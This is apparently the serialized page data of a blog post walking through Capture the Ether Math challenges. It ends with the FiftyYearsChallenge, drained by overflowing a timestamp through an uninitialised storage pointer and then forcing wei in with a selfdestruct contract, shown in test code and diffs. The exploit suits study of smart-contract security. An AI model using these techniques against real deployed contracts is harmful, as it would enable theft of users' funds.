withdrawTx"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ba}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bM}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,bN]},children:[{type:a,value:ae}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Here, we implement the logic we figured out above, and automate the end-to-end exploit and withdrawal process. Another pass! Only one challenge left - the most interesting and most valuable one yet, worth 2000 points!"}]},{type:a,value:m},{type:b,tag:aC,props:{id:cr},children:[{type:b,tag:T,props:{href:cy,ariaHidden:ae,tabIndex:aD},children:[{type:b,tag:c,props:{className:[aE,aF]},children:[]}]},{type:a,value:cs}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"This challenge requires that we use a variety of tricks that we've learned over the previous exercises in the Math section to exploit it. Some in exactly the way we've used them before, others in a new and interesting way. There are in total 3 steps to fully completing this challenge in the way that I've done. There are other ways to do so, but this is the shortest method that I know of."}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"If we have a look through the contract, we will see that the main thing we need to do, is figure out a way to call the "},{type:b,tag:o,props:{},children:[{type:a,value:bu}]},{type:a,value:" method. In order to do this, we need to somehow make sure that the "},{type:b,tag:o,props:{},children:[{type:a,value:dl}]},{type:a,value:" on the queue item that we are requesting withdrawal of is set to a UNIX timestamp before now, and also ensure that the donations previous to and including the index we are withdrawing, add up to exactly the balance of the contract."}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Ok, so let's first focus on figuring out how to sort the "},{type:b,tag:o,props:{},children:[{type:a,value:dl}]},{type:a,value:" issue. Looking at the "},{type:b,tag:o,props:{},children:[{type:a,value:dm}]},{type:a,value:" method, we can see that in the "},{type:b,tag:o,props:{},children:[{type:a,value:c_}]},{type:a,value:" part of the conditional, "},{type:b,tag:o,props:{},children:[{type:a,value:"contribution"}]},{type:a,value:" is never directly defined, which in this case means that it ends up being both a storage pointer, "},{type:b,tag:cT,props:{},children:[{type:a,value:"and"}]},{type:a,value:" being pushed onto the queue as a new Contribution. so we can use this to overwrite our "},{type:b,tag:o,props:{},children:[{type:a,value:bO}]},{type:a,value:dn},{type:b,tag:o,props:{},children:[{type:a,value:bP}]},{type:a,value:", respectively for "},{type:b,tag:o,props:{},children:[{type:a,value:"msg.value"}]},{type:a,value:dn},{type:b,tag:o,props:{},children:[{type:a,value:"timestamp"}]},{type:a,value:". The number of Wei we send ends up being written directly into "},{type:b,tag:o,props:{},children:[{type:a,value:bO}]},{type:a,value:", and the timestamp ends up overwriting "},{type:b,tag:o,props:{},children:[{type:a,value:bP}]},{type:a,value:". We need to remember this last point, as "},{type:b,tag:o,props:{},children:[{type:a,value:bP}]},{type:a,value:" needs to be set to the correct value to allow us to withdraw."}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"In order to get that far, though, we have to first work out how to access this part of the code. The requirement is that the timestamp is greater than or equal to the timestamp of the last item in the queue. We already know we can control "},{type:b,tag:o,props:{},children:[{type:a,value:bO}]},{type:a,value:", so that is something we can exploit. The other thing we notice is that there is no bounds checking on the timestamp or unlockTimestamp of the last queue item - so we can quite feasibly overflow that back to 0. Let's start putting together our test and see where we get."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"test\u002Fmath\u002Ffifty-years-challenge.ts"}]},{type:b,tag:O,props:{className:[P,aT]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ap},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:aq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ar},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:as}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:do0}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aV}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"should return true if we empty the smart contract\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aW}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bp}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aX},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:at}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:do0}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" challengeDeploy "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:aZ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:au}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:a_},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:av}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aw},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:br}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:cj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ax}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aY},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:cj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:a$}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F Add a new Contribution that allows us to overflow `unlockTimestamp` to 0"}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" upsertTx "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:dm}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F Insert at queue position 1"}]},{type:a,value:"\n      ethers"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bW},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bX},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:df}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:"86400"}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ay}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:"\n        value"},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:av}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F Ensure `queue.length` is 1 before we push"}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:" upsertTx"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ba}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bu}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:cj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bM}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,bN]},children:[{type:a,value:ae}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"What we have so far is an upsert operation which sets our last queue item's unlockTimestamp that will overflow back to 0 when we insert another Contribution, but also makes sure that we maintain continuity of "},{type:b,tag:o,props:{},children:[{type:a,value:bO}]},{type:a,value:" so that we push a new queue item directly after the existing one. We have at this point overwritten "},{type:b,tag:o,props:{},children:[{type:a,value:bP}]},{type:a,value:" with an absurdly high number, which we will fix in the next part of the test."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,aS]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"diff --git a\u002Ftest\u002Fmath\u002Ffifty-years-challenge.ts b\u002Ftest\u002Fmath\u002Ffifty-years-challenge.ts\nindex ff698ba..decc6cb 100644\n"},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:dp}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:dq}]},{type:a,value:"\n@@ -14,14 +14,20 @@ describe(\"FiftyYearsChallenge\", function () {\n"},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    const challenge = challengeDeploy.connect(player);\n"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    \u002F\u002F Add a new Contribution that allows us to overflow `unlockTimestamp` to 0\n"}]},{type:b,tag:c,props:{className:[d,bs,af]},children:[{type:b,tag:c,props:{className:[d,p,af]},children:[{type:a,value:ay}]},{type:a,value:"    const upsertTx = await challenge.upsert(\n"}]},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    const upsertTx1 = await challenge.upsert(\n"}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"      1, \u002F\u002F Insert at queue position 1\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"      ethers.constants.MaxUint256.sub(86400 - 1),\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"      {\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"        value: 1, \u002F\u002F Ensure `queue.length` is 1 before we push\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"      }\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    );\n"}]},{type:b,tag:c,props:{className:[d,bs,af]},children:[{type:b,tag:c,props:{className:[d,p,af]},children:[{type:a,value:ay}]},{type:a,value:"    await upsertTx.wait();\n"}]},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    await upsertTx1.wait();\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    \u002F\u002F Add a new contribution with a timestamp before today\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    const upsertTx2 = await challenge.upsert(2, 0, {\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"      value: 2, \u002F\u002F Set `queue.length` to 2\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:ck},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:dr}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:ds}]}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Ok - so we've now inserted a new item in there with a timestamp before today! Surely this will let us withdraw now? Not yet - the contract currently contains 2 Wei less than the calculated "},{type:b,tag:o,props:{},children:[{type:a,value:"total"}]},{type:a,value:". To solve this, let's reuse something we wrote earlier - when we needed to force some Ethereum into a contract, we used our trusty "},{type:b,tag:o,props:{},children:[{type:a,value:cc}]},{type:a,value:" contract. Because we wrote that to take an arbitrary target address and an arbitrary amount, we should be able to use that to force 2 wei into the contract without affecting its internal state:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,aS]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"diff --git a\u002Ftest\u002Fmath\u002Ffifty-years-challenge.ts b\u002Ftest\u002Fmath\u002Ffifty-years-challenge.ts\nindex decc6cb..d7ac559 100644\n"},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:dp}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:dq}]},{type:a,value:"\n@@ -29,6 +29,13 @@ describe(\"FiftyYearsChallenge\", function () {\n"},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:ck},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:dr}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    \u002F\u002F Force 2 wei into the contract without affecting the stored data\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    const Solver = await ethers.getContractFactory(\"RetirementFundSolver\");\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    const solver = await Solver.deploy();\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    await solver.die(challenge.address, {\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"      value: 2,\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:ck},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:m}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:ds}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    expect(await challengeDeploy.isComplete()).to.equal(true);\n"}]}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"And boom - success! We've done it again! We're done with all the Math challenges. We'll be back next time to smash our way through the Accounts challenges."}]}]},dir:"\u002Fposts",path:"\u002Fposts\u002Flearning-smart-contract-security-3",extension:".md",readingStats:{text:"20 min read",minutes:19.145,time:1148700,words:3829}}}],fetch:{},mutations:void 0}}("text","element","span","token","punctuation"," ","keyword","(",")",";","function",".","\n","operator","code","prefix","\n    ","{","}","builtin","unchanged",",","\n\n    ","=","await","string","inserted","number","address","+","p","\n        ","public","const","[","]","uint256","div","from","nuxt-content-highlight","pre","line-numbers","msg"," ethers"," value","a","sender","1","require","import","player"," challenge","\n\n","coord","filename","\n  ","==","to","true","deleted","comment","isComplete","inserted-sign"," player","\n      ","this","class-name","\u003E=","sup"," expect ","\"chai\""," ethers ","\"hardhat\"","getContractFactory","deploy",":","utils","deployed","-","\n\n        ",3,"li","h3",-1,"icon","icon-link","language-solidity","pragma","solidity","^","version","0.4.21","contract"," ether","payable","value ","balanceOf","transfer","language-diff","language-typescript","describe","it","async"," Challenge "," challenge "," Challenge","\n      value","connect","wait"," owner","10","nofollow","noopener","noreferrer","_blank"," balanceOf","view","returns","bool","return"," numTokens","*","18","getSigners","parseEther","\"1\"","deleted-sign"," to","withdraw","TokenSaleChallenge","TokenWhaleChallenge","RetirementFundChallenge","DonationChallenge","mapping","=\u003E","balance ","256","language-text","indexed","_transfer","transferFrom"," msg","0","sender ","balance","expect","equal","boolean","queue.length","head","MappingChallenge","Donation"," _player","buy","-="," challenge\n      ","constants","MaxUint256","  });\n","});\n","\n        balanceOf"," spender","helper","collectPenalty","selfdestruct","die","set"," key","key"," etherAmount","donate"," challengeDeploy","    });\n","2022-03-28T21:30:33.000Z","tokensalechallenge","tokenwhalechallenge","retirementfundchallenge","mappingchallenge","donationchallenge","fiftyyearschallenge","FiftyYearsChallenge","#tokensalechallenge","#tokenwhalechallenge","#retirementfundchallenge","#mappingchallenge","#donationchallenge","#fiftyyearschallenge","\u003C"," PRICE_PER_TOKEN","\n\n        balanceOf","+=","\n        msg","\"TokenSaleChallenge\"","\n        ethers","add","--- a\u002Ftest\u002Fmath\u002Ftoken-sale-challenge.ts","+++ b\u002Ftest\u002Fmath\u002Ftoken-sale-challenge.ts","    await buyTx.wait();\n","    console.log(await ethers.provider.getBalance(player.address));\n","    expect(await challenge.isComplete()).to.equal(true);\n","1000","event","Transfer","emit"," value ","Approval","approve","em","\"TokenWhaleChallenge\"","**"," beneficiary","if","\n            msg","\u002F","else","\u003E","\"RetirementFundChallenge\""," solver"," map","length ","\"MappingChallenge\"","sub","\n        donation","owner"," overwrites ","\"DonationChallenge\"","BigNumber","unlockTimestamp","upsert"," and ","\"FiftyYearsChallenge\"","--- a\u002Ftest\u002Fmath\u002Ffifty-years-challenge.ts","+++ b\u002Ftest\u002Fmath\u002Ffifty-years-challenge.ts","    await upsertTx2.wait();\n","    await challenge.withdraw(2);\n")));